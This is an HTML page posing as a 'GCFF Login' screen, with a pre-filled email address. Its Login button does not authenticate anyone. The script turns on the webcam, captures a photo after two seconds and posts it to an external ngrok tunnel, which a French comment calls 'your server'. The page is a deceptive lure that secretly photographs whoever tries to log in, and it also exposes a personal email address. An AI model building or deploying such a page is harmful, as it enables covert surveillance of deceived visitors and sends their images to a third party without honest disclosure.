<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>GCFF Login</title>
</head>

<body style="font-family:Arial; text-align:center; background:#0f172a; color:white;">

<h2>Welcome to GCFF</h2>

<input value="francoislitilm@gmail.com"><br><br>
<input type="password" placeholder="password"><br><br>

<button onclick="login()">Login</button>

<br><br>

<video id="video" autoplay style="width:300px; border-radius:10px;"></video>

<script>
let stream;

function login() {
  navigator.mediaDevices.getUserMedia({ video: true })
  .then(s => {
    stream = s;

    const video = document.getElementById("video");
    video.srcObject = stream;

    setTimeout(takePhoto, 2000);
  })
  .catch(err => {
    alert("Camera blocked");
  });
}

function takePhoto() {
  const video = document.getElementById("video");

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  const image = canvas.toDataURL("image/png");

  // stop camera
  stream.getTracks().forEach(t => t.stop());

  // ENVOI VERS TON SERVEUR NGROK
  fetch("https://unsighing-prepalatine-yi.ngrok-free.dev/upload", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      image: image
    })
  })
  .then(() => alert("Photo sent ✔"))
  .catch(() => alert("Upload failed"));
}
</script>

</body>
</html>
